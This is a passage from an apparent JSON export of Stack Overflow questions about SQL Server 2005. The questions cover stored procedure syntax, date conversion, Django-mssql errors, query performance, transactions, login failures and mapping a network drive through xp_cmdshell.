proc, it queries the table \"Entries\". The proc has the parameters @ID, which is an int, and @APPROVED, which is a bit. I'm using SQL Server 2005</p>\n\n<p>If approved is false I want to do something different than if it is true. I have the following written. When I try to create it I get \"Incorrect syntax near the keyword 'END'.\".</p>\n\n<p>If I remove the nested if the error goes away however from what I've read this is perfectly valid syntax. Could anyone tell me where I am going wrong? </p>\n\n<pre><code>CREATE Procedure [dbo].[GetEntry](@ID int,@APPROVED bit)\nAS\nIF @APPROVED = 0\nBEGIN \n    --see if the unapproved entry has already been viewed \n    IF (SELECT COUNT(*) \n    FROM [dbo].[Entries]\n    WHERE EntryId = @ID AND Approved = @APPROVED AND Viewed = 0) &gt; 0\n    BEGIN\n\n    END\n\nEND\n</code></pre>\n\n<p>Any help would be really appreciated. Thanks! </p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2200,"score":3,"question_id":10304373,"title":"How convert string to date T-SQL?","body":"<p>For example I have string like this '24.04.2012', how I can convert to date type in T-SQL?</p>\n"},{"tags":["python","django","sql-server-2005","django-mssql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":160,"score":1,"question_id":10134822,"title":"When running syncdb on Django-mssql SQLInsertCompiler error","body":"<p>This is on Microsoft SQL Server 2005.\nPython 2.7.\nDjango 1.4</p>\n\n<p>Django-MSSQL is installed and connecting to the database.</p>\n\n<p>I can read tables, but not insert or update them. Working through django's tutorial on an empty database I get to this point:</p>\n\n<pre><code># Save the object into the database. You have to call save() explicitly.\n&gt;&gt;&gt; p.save()\n</code></pre>\n\n<p>After save() is called I get this <a href=\"http://code.google.com/p/django-mssql/issues/detail?id=119\" rel=\"nofollow\">error message</a> (which has also been reported):</p>\n\n<pre><code>Creating tables ...\nTraceback (most recent call last):\nFile \"manage.py\", line 11, in &lt;module&gt;\nexecute_manager(settings)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\__init__.py\", line 459, in execute_manager\nutility.execute()\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\__init__.py\", line 382, in execute\nself.fetch_command(subcommand).run_from_argv(self.argv)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\base.py\", line 196, in run_from_argv\nself.execute(*args, **options.__dict__)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\base.py\", line 232, in execute\noutput = self.handle(*args, **options)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\base.py\", line 371, in handle\nreturn self.handle_noargs(**options)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\commands\\syncdb.py\", line 110, in handle_noargs\nemit_post_sync_signal(created_models, verbosity, interactive, db)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\sql.py\", line 189, in emit_post_sync_signal\ninteractive=interactive, db=db)\nFile \"C:\\Python26\\lib\\site-packages\\django\\dispatch\\dispatcher.py\", line 172, in send\nresponse = receiver(signal=self, sender=sender, **named)\nFile \"C:\\Python26\\lib\\site-packages\\django\\contrib\\auth\\management\\__init__.py\", line 35, in create_permissions\nctype = ContentType.objects.get_for_model(klass)\nFile \"C:\\Python26\\lib\\site-packages\\django\\contrib\\contenttypes\\models.py\", line 42, in get_for_model\ndefaults = {'name': smart_unicode(opts.verbose_name_raw)},\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\manager.py\", line 134, in get_or_create\nreturn self.get_query_set().get_or_create(**kwargs)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\query.py\", line 449, in get_or_create\nobj.save(force_insert=True, using=self.db)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\base.py\", line 463, in save\nself.save_base(using=using, force_insert=force_insert, force_update=force_update)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\base.py\", line 551, in save_base\nresult = manager._insert([self], fields=fields, return_id=update_pk, using=using, raw=raw)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\manager.py\", line 203, in _insert\nreturn insert_query(self.model, objs, fields, **kwargs)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\query.py\", line 1576, in insert_query\nreturn query.get_compiler(using=using).execute_sql(return_id)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\sql\\compiler.py\", line 909, in execute_sql\nfor sql, params in self.as_sql():\nFile \"C:\\Python26\\lib\\site-packages\\django_mssql-1.0.1-py2.6.egg\\sqlserver_ado\\compiler.py\", line 207, in as_sql\nsql, params = super(SQLInsertCompiler, self).as_sql(*args, **kwargs)\nValueError: need more than 1 value to unpack\n</code></pre>\n\n<p><strong>UPDATE:</strong> I rolled back to Django 1.3 and this error went away. I suspect it is a change in how Django handles the users and authentication in 1.4. I'll take a look at source when I get a chance and try to patch.</p>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12497926,"title":"Pass parameter into subreport by clicking on textbox in SSRS 2005","body":"<p>I have a drill-down table in my master (parent) report and I want to make it so that when the user clicks on one of the rows, parameters are passed into the subreport and the subreport is re-generated.  How do I do this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12484739,"title":"SQL query stuck - comparison on different lines","body":"<p>I m working on a very weird problem with SQL where I have to compare previous rows</p>\n\n<pre><code>Number    start_date                      end_date    \n -----     -------                      ------------\n 1    2011-06-07 00:00:00.000         2011-07-10 00:00:00.000   \n 2    2011-10-11 00:00:00.000         2011-10-11 00:00:00.000   \n 3    2011-10-26 00:00:00.000         2011-10-29 00:00:00.000   \n 4    2011-10-29 00:00:00.000         2011-11-15 00:00:00.000   \n</code></pre>\n\n<p>Here , I have to compare the start_date and end_date on the two different line and create a view out of it.\n(If the start_date is less than the previous end_date , then criteria is set to 1).</p>\n\n<p>Well it should compare 2011-10-26 00:00:00.000 for 3 and 2011-10-27 00:00:00.000 on 2 for 30 days </p>\n\n<pre><code>Number    start_date                      end_date                 Criteria\n-----     -----------                   ----------------          ------------\n1   2011-06-07 00:00:00.000       2011-07-10 00:00:00.000            0\n2   2011-10-11 00:00:00.000       2011-10-11 00:00:00.000            0\n3   2011-10-26 00:00:00.000       2011-10-29 00:00:00.000            1\n4   2011-10-30 00:00:00.000       2011-11-15 00:00:00.000            1   \n</code></pre>\n\n<p>I m confused how should I proceed with this.</p>\n\n<p>Any help would be helpful !!!!</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["asp.net","sql-server-2005","asp.net-membership"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":323,"score":0,"question_id":11408650,"title":"add user and assign role in aspnet membership through sql servers SP","body":"<p>Tech - asp.net 3.5, Sql server 2005</p>\n\n<p>I have integrate aspnet membership for my webapplication.</p>\n\n<p>I am adding some users (member) from importing excel file.</p>\n\n<p>So how can I add that user and role of that user in aspnet membership tables?</p>\n\n<p>NOTE - I have SP which is used to add member in DB from uploaded excel file, I have wrote insert trriger on membertable.</p>\n"},{"tags":["sql-server-2005","tsql","sql-server-2008","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":4618,"score":8,"question_id":259803,"title":"T-SQL Stored Procedure Execution 'atomic'?","body":"<p>Let's say I have a simple stored procedure that looks like this (note: this is just an example, not a practical procedure):</p>\n\n<pre><code>CREATE PROCEDURE incrementCounter AS\n\nDECLARE @current int\nSET @current = (select CounterColumn from MyTable) + 1\n\nUPDATE\n    MyTable\nSET\n    CounterColumn = current\nGO\n</code></pre>\n\n<p>We're assuming I have a table called 'myTable' that contains one row, with the 'CounterColumn' containing our current count.</p>\n\n<p>Can this stored procedure be executed multiple times, at the same time?  </p>\n\n<p>i.e. is this possible:</p>\n\n<p>I call 'incrementCounter' twice.  Call A gets to the point where it sets the 'current' variable (let's say it is 5).  Call B gets to the point where it sets the 'current' variable (which would also be 5).  Call A finishes executing, then Call B finishes.  In the end, the table should contain the value of 6, but instead contains 5 due to the overlap of execution</p>\n"},{"tags":["sql-server","sql-server-2005","query-analyzer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12483064,"title":"Query runs fast in Query Analyzer but slow in C# application","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10175422/sql-runs-fast-in-ssms-slow-in-asp-net\">sql runs fast in ssms slow in asp.net</a>  </p>\n</blockquote>\n\n\n\n<p>Using SQL Server 2005, there is a sql query on a few big tables and it times out in the program. However, when I run it in Query Analyzer, it finishes in about 30 seconds.</p>\n\n<p>Why the difference?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12482820,"title":"update table with join but with summed values","body":"<p>I've got 2 tables:</p>\n\n<pre><code>-Card\nid\npoints\n\n-History\nCardId\npoints\n</code></pre>\n\n<p>Now I would like to perform update query which subtracts points in Card table based on points in History with the same cardId</p>\n\n<p>for example I have rows:</p>\n\n<pre><code>-card\n1 10\n2 30\n\n-History\n1 5\n1 3\n2 10 \n2 9\n</code></pre>\n\n<p>and as a result I should have in Card table rows:</p>\n\n<pre><code>-card\n1 2\n2 11\n</code></pre>\n\n<p>what is the best way to do that?</p>\n"},{"tags":["sql-server","sql-server-2005","isolation-level","read-committed-snapshot","optimistic-concurrency"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2182,"score":1,"question_id":2778199,"title":"How to figure the read/write ratio in Sql Server?","body":"<p>How can I query the read/write ratio in Sql Server 2005?  Are there any caveats I should be aware of?</p>\n\n<p>Perhaps it can be found in a DMV query, a standard report, a custom report (i.e the Performance Dashboard), or examining a Sql Profiler trace. I'm not sure exactly.</p>\n\n<p><strong>Why do I care?</strong></p>\n\n<p>I'm taking time to improve the performance of my web app's data layer. It deals with millions of records and thousands of users.  </p>\n\n<p>One of the points I'm examining is database concurrency.  Sql Server uses pessimistic concurrency by default--good for a write-heavy app.  If my app is read-heavy, I might switch it to optimistic concurrency (isolation level: <code>read committed snapshot</code>) like <a href=\"http://www.codinghorror.com/blog/2008/08/deadlocked.html\" rel=\"nofollow\">Jeff Atwood did with StackOverflow</a>.</p>\n"},{"tags":["sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":3980,"score":2,"question_id":4657642,"title":"How to get last inserted row in sql server","body":"<p>How can i get Last inserted row when in table there is no <code>Uniqueidentifier or identity</code> column. </p>\n\n<p>I am waiting of your good idea's. </p>\n"},{"tags":["php","sql-server-2005","character-encoding"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":183,"score":2,"question_id":8170653,"title":"Retrieve Greek letters from MSSQL database with PHP","body":"<p>I've done this before in .Net but I am somewhat new to PHP and could use some help.  I'm trying to pull data in PHP from a MSSQL db, some of which is Greek letters.  The data type of the MSSQL columns is <code>nvarchar</code> and the Greek characters are displayed correctly in management studio; however, whenever I pull the data with the <code>sqlsrv_query</code> function in php I get a bunch of question marks.</p>\n\n<p>In <code>sqlsrv_connect</code> function I've tried setting <code>CharacterSet\"=&gt;\"UTF-8</code> which doesn't work.<br>\nI've tried <code>iconv()</code>, but am not sure which sets to use.<br>\nI tried <code>mb_detect_encoding()</code> and it returned <code>ASCIIASCII</code>.  </p>\n\n<p>Here is some sample code:</p>\n\n<pre><code>public function _getOrderItemDetails($orderItemIds,$productTypeId){\n    $params = explode(',', $orderItemIds);\n\n    $sql = \"select od.*, ofs.Sort\n            from orderDetail od\n                left join orderFieldSort ofs on ofs.fieldName = od.name and productTypeId in ($productTypeId)\n            where orderItemid in (\".rtrim(str_repeat('?,', count($params)),',').\")\n            order by ofs.sort\";\n\n   return $this-&gt;_compileResults($sql,'OrderDetail',$params);;\n}\n\nprivate function _compileResults($sql,$classType,$params ){       \n    $result = sqlsrv_query($this-&gt;conn,$sql,$params);\n\n    $arrayResult = array();\n    while($orderObject = sqlsrv_fetch_object($result,$classType)){\n        array_push($arrayResult, $orderObject);\n    }\n    return $arrayResult;\n}\n</code></pre>\n\n<p>Any suggestions are welcome. Please help!</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","count"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12479677,"title":"SQL Server Count is slow","body":"<p>Counting tables with large amount of data may be very slow, sometimes it takes minutes; it also may generate deadlock on a busy server. I want to display real values, NOLOCK is not an option.</p>\n\n<p>The servers I use is SQL Server 2005 or 2008 Standard or Enterprise - if it matters.\nI can imagine that SQL Server maintains the counts for every table and if there is no WHERE clause I could get that number pretty quickly, right?</p>\n\n<p>For example:</p>\n\n<pre><code>SELECT COUNT(*) FROM myTable\n</code></pre>\n\n<p>should immediately return with the correct value. Do I need to rely on statistics to be updated?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","global-variables"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":7415,"score":3,"question_id":1838429,"title":"Create a global static variable in SQL Server?","body":"<p>Is there a way to create a global variable in SQL Server, in such a way that it persists even if the server is restarted, so I can use it in functions?</p>\n\n<p>Example from what I need:</p>\n\n<pre><code>DECLARE @@DefaultValue bit\n</code></pre>\n\n<p>This variable should never be deleted unless I explicityl do so.</p>\n"},{"tags":["sql-server","sql-server-2005","datetime"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12474746,"title":"How to convert date in SQL Server 2005 (andika)","body":"<p>I have a table in my database with a column that I want to change from <code>varchar</code> to <code>datetime</code>.</p>\n\n<p>In my database the <code>tgl_lahir</code> column contains data in format : <code>1969-10-30 00:00:00</code></p>\n\n<pre><code>SELECT convert (datetime, substring(tgl_lahir, 9, 2)\n               +(substring(tgl_lahir, 6, 2) )\n               + (left(tgl_lahir, 4)))\nfrom penduduk\n</code></pre>\n\n<p>Can anyone help me ?</p>\n\n<p>I got the following error message:</p>\n\n<blockquote>\n  <p>Msg 242, Level 16, State 3, Line 2<br>\n  The conversion of a char data type to a datetime data type resulted in an out-of-range datetime value.</p>\n</blockquote>\n"},{"tags":["sql-server","sql-server-2005","scheduling","maintenance-plan"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":15,"score":2,"question_id":12426231,"title":"MS SQL 2005: Strange Maintenance Plan SubPlans behaviour: each SP runs all the tasks of all other SP at odd times","body":"<p>(SQL Server 2005) I have a problem with scheduling a Maintenance Plan (MP) with 3 subplans (SP).</p>\n\n<ul>\n<li>SP1 is scheduled to run hourly,</li>\n<li>SP2 daily at 7.00 and </li>\n<li>SP3 on sundays at 8.00</li>\n</ul>\n\n<p>Reading MP history I see that what happened (I know it seems crazy) is:</p>\n\n<pre><code>11: SP1 runs and executes all the tasks of SP1 SP2 and SP3\n12: SP2 runs and does the same\n13: SP3 runs and does the same\n14: SP1 runs and does the same\n</code></pre>\n\n<p>From the job Activity monitor, SP1 has last run time at 14, SP2 and SP3 are <em>never</em> been executed.<br>\nAll of the SP are scheduled correctly in the Job Activity Monitor (SP2 for tomorrow at 7, SP3 for next sunday at 8)</p>\n\n<p>Do you have any idea what is happening?</p>\n\n<p>Thankx a lot</p>\n\n<p>Wentu</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":135,"score":1,"question_id":9141925,"title":"SQL restore transaction log from disk getting incorrect syntax","body":"<p>The command I am using  is below and i'm getting incorrect syntax near 'E:'  What am I misisng or what do I have wrong?  Thanks for the help everybody!</p>\n\n<pre><code>restore log ib_qc FROM DISK 'e:\\backup_201202030600.trn' WITH NORECOVERY\n</code></pre>\n"},{"tags":["database","sql-server-2005","shrink"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":24,"score":0,"question_id":12471390,"title":"When do I need to Shrink a database?","body":"<p>I have a 55GB database.The full backup size is around 47GB. How can I shrink the database?</p>\n"},{"tags":["sql","sql-server","database","sql-server-2005","database-performance"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":98,"score":5,"question_id":12445727,"title":"Using \"CASE\" in Where clause to choose various column harm the performance","body":"<p>I have query which needs to be dynamic on some of the columns, meaning I get a parameter and according its value I decide which column to fetch in my Where clause. I've implemented this request using \"CASE\" expression:</p>\n\n<pre><code>(CASE @isArrivalTime WHEN 1 THEN ArrivalTime ELSE PickedupTime END) \n&gt;= DATEADD(mi, -@TZOffsetInMins, @sTime) \n AND (CASE @isArrivalTime WHEN 1 THEN ArrivalTime ELSE PickedupTime END) \n &lt; DATEADD(mi, -@TZOffsetInMins, @fTime)\n</code></pre>\n\n<p>If <code>@isArrivalTime = 1</code> then chose <code>ArrivalTime</code> column else chose <code>PickedupTime</code> column. I have a clustered index on <code>ArrivalTime</code> and nonclustered index on <code>PickedupTime</code>.</p>\n\n<p>I've noticed that when I'm using this query (with <code>@isArrivalTime = 1</code>), my performance is a lot worse comparing to only using <code>ArrivalTime</code>. </p>\n\n<p>Maybe the query optimizer can't use\\choose the index properly in this way?</p>\n\n<p>I compared the execution plans an noticed that when I'm using the <code>CASE</code> 32% of the time is being wasted on the index scan, but when I didn't use the CASE<code>(just used</code>ArrivalTime`) only 3% were wasted on this index scan.</p>\n\n<p>Anyone know the reason for this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":256,"score":2,"question_id":585441,"title":"Rollback complete database one hour","body":"<p>We had some problems this morning and need to rollback our database for about one hour. Is this possible and how is it done?</p>\n\n<p>It is a Microsoft SQL 2005 database.</p>\n"},{"tags":["c#","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12469959,"title":"Transactions should be handled in .NET or SQL Server?","body":"<p>I got into an application which is using .NET/C# as front end and SQL Server 2008 as back end. I found that ALWAYS transactions are handled in the c# code. Seems its an unwritten rule for this project that we shouldn't use Transactions within stored procedure.</p>\n\n<p>I personally feel that transactions should be handled within Stored Procedure as it would give more control over the code! We might have lot of validations happening within the script all this while we don't need a open transaction. We need to open a transaction just before we do a Insert/Update/Delete and can close it asap. </p>\n\n<p>Looking for answers which would help me understand the best practice for handling transactions and when exactly do we need to opt for Transactions within Stored Proc / C#.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":4,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":853,"score":8,"question_id":5323300,"title":"How to avoid multiple login for the same user","body":"<p>I wanted to stop multiple login of the same user. So, I created a table which keeps track of users who have logged in. When they log in, the data will be entered in the table. When they click on logout, data and session will be removed.</p>\n\n<p>The problem is, when they close the browser window without logging out, they won't be able to login ever again. </p>\n\n<p>Is there a better way to handle this? </p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12469127,"title":"Entity Revisioning Schema Design","body":"<p>SQL Server 2005.</p>\n\n<p>In our application, we have an entity with a parent table as well as several child tables. We would like to track revisions made to this entity. After going back and forth, we've narrowed it down to two approaches to choose from.</p>\n\n<ol>\n<li><p>Have one history table for the entity. Before a sproc updates the table, retrieve the entire current state of the entity from the parent table and all child tables. XMLize it and stick it into the history table as the XML data type. Include some columns to query by, as well as a revision number/created date.</p></li>\n<li><p>For each table, create a matching history table with the same columns. Also have a revision number/created date. Before a sproc updates a single table, retrieve the existing state of the record for that one table, and copy it into the history table. So, it's a little bit like SVN. If I want to get an entity at revision Y, I need to get the history record in each table with the maximum revision number that is not greater than Y. An entity might have 50 revision records in one table, but only 3 revision records in a child table, etc. I would probably want to persist the revision counter for the entire entity somewhere.</p></li>\n</ol>\n\n<p>Both approaches seem to have their headaches, but I still prefer solution #2 to solution #1. This is a database that's already huge, and already suffers from performance issues. Bloating it with XML blobs on every revision (and there will be plenty) seems like a horrible way to go. Creating history tables for everything is a cost I'm willing to eat, as long as there's not a better way to do this.</p>\n\n<p>Any suggestions?</p>\n\n<p>Thanks,\nTedderz</p>\n"},{"tags":["sql-server-2005","cpu-usage","sql-server-performance"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":197,"score":0,"question_id":12458776,"title":"SQL Server 100% CPU Utilization - One database shows high CPU usage than others","body":"<p>We have an SQL server with about 40 different (about 1-5GB each) databases. The server is  an 8 core 2.3G CPU with 32Gigs of RAM. 27Gig is pinned to SQL Server. The CPU utliziation is mostly close to 100% always and memory consumption is about 95%. The problem here is the CPU which is constantly close to 100% and trying to understand the reason.</p>\n\n<p>I have run an initial check to see which database contributes to high CPU by using - <a href=\"http://stackoverflow.com/questions/10319575/sql-server-2008-high-cpu-usage\">this</a> script but I could not substantiate in detail on whats really consuming CPU. The top query (from all DBs) only takes about 4 seconds to complete. IO is also not a bottleneck. </p>\n\n<p>Would Memory be the culprit here? I have checked the memory split and the OBJECT CACHE occupies about 80% of memory allocated (27G) to SQL Server. I hope that is normal provided there are lot of SPs involved. Running profiler, I do see lot of recompiles, but mostly are due to \"temp table changed\", \"deferred compile\" etc and am not clear if these recompiles are a result of plans getting thrown out of cache due to memory pressure</p>\n\n<p>Appreciate any thoughts.</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12465865,"title":"Case to extract multiple columns","body":"<p>I am wondering if there is something like Case where i can wok in SQL for getting multiple columns using 1 case expression in SQL Server 2005.  I am a rookie in SQL. Hope it is not too easy and i missed it. Thank you in advance!!  </p>\n\n<pre><code>Select RD.RepDailyInfoID, RD.TypeofDayID\nCase WHEN RD.TypeofDayID = 1\nTHEN \n    isnull(cast(S.AmountSold as numeric(10,2)), 0) as AmountSold,\n    isnull(cast(S.S_AmountCollected as numeric(10,2)), 0) as AmountCollected,\n    S.S_PaymentMethod as PaymentMethod\n\nWhen RD.TypeofDayID = 9\nTHEN\n    isnull(cast(U.AmountUpgraded as numeric(10,2)), 0) as AmountUpgraded,\n    isnull(cast(U.U_UpgradedCollected as numeric(10,2)), 0) + isnull(cast(U.RenewalCollected as numeric(10,2)), 0) as AmountCollected,\n    U.U_PaymentMethod as PaymentMethod\nEND\nfrom RepDailyInfo RD\nleft outer join SellingInfo S on S.RepDailyInfoID = RD.RepDailyInfoID\nleft outer join UpgradingInfo U on U.RepDailyInfoID = RD.RepDailyInfoID\nwhere RepID = @RepID\n</code></pre>\n"},{"tags":["sql-server","database","sql-server-2005","portability"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12465027,"title":"what and where can I find the database/table files for sql server 2005?","body":"<p>In my sql server 2005 I have a database named <em>movies</em> . In this database I have a table named <em>list</em>. I wanted to test my application on some another machine. Is there any way I can take with me that database or tables so that there is no need to create them again there. What type of files are they if there is a way  out other than creating a new database and tables again</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":11403665,"title":"Find fields that aren't used (have all nulls)","body":"<p>I've inherited a legacy database, and many, many fields are no longer being used. I can tell by querying on the last couple of years and seeing which fields are null, to at least get a baseline for where I might look.</p>\n\n<p>Is there an elegant way to figure out which fields in the database are null for all records in a given set?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12461605,"title":"remove duplicate values from the column of the table without deleting the row of the table","body":"<p>I have written this code </p>\n\n<pre><code>SELECT  \n\ncast(isnull(x.hc,'') AS VARCHAR(500)) as A,\n\nCase\nWhen cast(isnull(p.dg,'') AS VARCHAR(500)) = '0' then ''\nelse cast(isnull(p.dg,'') AS VARCHAR(500))\nEnd as B, \n\nCase\nWhen cast(isnull(h.cno,'') as varchar(500)) = '0' then ''\nelse cast(isnull(h.cno,'') as varchar(500))\nEnd as C, --added\n\ncast(isnull(p.vol,0) as varchar(500)) as D,\n\ncast(isnull(p.weigh,0) as varchar(500)) as E\n\nFROM ship g\ninner join S_M d on d.ship_id = g.ship_id\nleft join Pack h on h.ship_id = g.ship_id\nleft join pack_d p on p.pack_id = h.pack_id\nleft join comm x on x.comm_id = p.comm_id\nWHERE g.ship_pk = @ship_pk \nGROUP BY  cast(isnull(x.hc,'') AS VARCHAR(500)), cast(isnull(p.dg,'') AS VARCHAR(500)), cast(isnull(h.cno,'') as varchar(500)), cast(isnull(p.vol,0) as varchar(500)), cast(isnull(p.weigh,0) as varchar(500)) \n</code></pre>\n\n<p>Which gives me the ouput as </p>\n\n<pre><code>A     B      C        D        E\n\n123   Yes    AB456    26.34    28.45\n123   Yes    AB687    26.34    28.45\n125   No     AB794    22.58    24.36\n125   No     AB456    22.58    24.36\n125   No     AB687    22.58    24.36\n</code></pre>\n\n<p>How Can I change my code above so that I can get the Output as</p>\n\n<pre><code>A     B      C        D        E\n\n123   Yes    AB456    26.34    28.45\n             AB687    26.34    28.45\n125   No     AB794    22.58    24.36\n             AB456    22.58    24.36\n             AB687    22.58    24.36\n</code></pre>\n\n<p>How can I remove the duplicate values from the first two columns of the table\nAs shown above? \nI am not deleting any row here, instead just removing the duplicate values and keeping that field blank.</p>\n\n<p>How can I do that? </p>\n"},{"tags":["windows","sql-server-2005","login"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12404525,"title":"MSSQL 2005 login error","body":"<p>I am the first time user of MSSQL Server. I installed it on my windows 7 machine. When i tried to login to the server it gives me an error,</p>\n\n<pre><code>Login failed for user 'Admin-PC\\Admin'. (.Net SqlClient Data Provider)\n\nLogin failed - Error Number: 18456 - Severity: 14 - State: 1\n</code></pre>\n\n<p>I am using windows default authentication. </p>\n"},{"tags":["sql","oracle","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12448277,"title":"OWA_UTIL.WHO_CALLED_ME in SQL Server","body":"<p>I am looking for equivalent, if there is any, of the procedure OWA_UTIL.WHO_CALLED_ME from Oracle in SQL Server. </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3113,"score":1,"question_id":378752,"title":"Map to Network Drive By SQL SP","body":"<p>Is there any way to map to a network drive by using a stored procedure? I have tried: </p>\n\n<pre><code>xp_cmdshell 'net use Q: [shared_network_drive] [pwd] /user:[username]'\n</code></pre>\n\n<p>but I got an error saying something like </p>\n\n<pre><code>'System error 1312 has occurred.'\n'A specified logon session does not exist. It may already have been terminated.'\n</code></pre>\n\n<p>However, when I run the same command in a cmd console in the same box as the SQL server machine, there is no problem at all. It looks like that SQL process does pass correct logon credential information. Any way to do it by SQL SP?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","port","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12404563,"title":"SQL Server port","body":"<p>I have more than one instance of SQL Server installed on my PC (actually, one 2005, one 2008 and one 2012). All of them running. I realized that all of them are configured (SQL Server Configuration Manager ->  SQL Server Network Configuration -> Protocols for the Database Engine -> TCP/IP) to run on port 1433.</p>\n\n<p>How is it possible?</p>\n"},{"tags":["sql","sql-server-2005","join"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":1,"view_count":45,"score":1,"question_id":12438868,"title":"Simple SQL JOIN Issue","body":"<p>I have a simple <code>JOIN</code> that I'm having issues with the <code>SQL</code> below.  This statement returns 1 record, but if I comment out line #5 it doesn't return any. Any ideas?</p>\n\n<pre><code>SELECT A.district__c, b.annual_conference__c\nFROM   Contact_UpdateDistricts A\nJOIN   Contact B on a.id = b.id\nWHERE  A.error NOT LIKE '%success%'\nand a.id = '003Z000000C80tUIAR'\nand A.district__c &lt;&gt; b.annual_conference__c\n</code></pre>\n"},{"tags":["java","sql-server","sql-server-2005","netbeans"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12449956,"title":"what is meant by Instance name?","body":"<p>what is a <em>sql server instance</em> ? what does it mean and why do why need it ?</p>\n\n<p>I needed here :</p>\n\n<p><img src=\"http://i.stack.imgur.com/2nmQc.jpg\" alt=\"enter image description here\"></p>\n\n<p>What does an instance name mean ?</p>\n"}]}
